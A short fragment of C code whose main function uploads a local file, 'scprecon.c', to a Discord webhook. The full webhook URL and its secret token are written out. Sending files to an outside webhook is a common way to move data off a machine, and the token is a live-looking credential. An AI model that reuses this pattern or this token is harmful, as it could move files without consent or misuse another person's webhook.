...
int main()
{
	send_discord_file("https://discordapp.com/api/webhooks/1242025297474486312/DA1GCR7ql8BhY-9PPt2pbZlDIjpdSWbndaiZuMKIvYnkfwts3IF9oYb2gwQg6yBm5XGk", "scprecon.c", "helo vps");
	return 0;
}
